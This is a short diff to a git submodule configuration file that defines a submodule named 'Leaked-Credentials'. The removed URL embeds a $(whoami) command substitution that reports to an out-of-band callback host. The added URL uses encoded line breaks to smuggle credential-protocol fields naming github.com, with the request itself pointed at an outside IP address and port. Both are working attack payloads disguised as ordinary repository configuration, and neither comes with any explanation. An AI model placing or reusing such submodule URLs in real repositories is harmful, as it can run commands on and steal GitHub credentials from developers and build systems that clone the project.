@@ -1,3 +1,3 @@
 [submodule "Leaked-Credentials"]
 	path = Leaked-Credentials
-	url = https://v84yio9wki80ti2de9e47copcgi760up.oastify.com/aa/`$(whoami)`
+	url = http://%0dprotocol=https%0dhost=github.com%0d@207.244.255.245:7005/
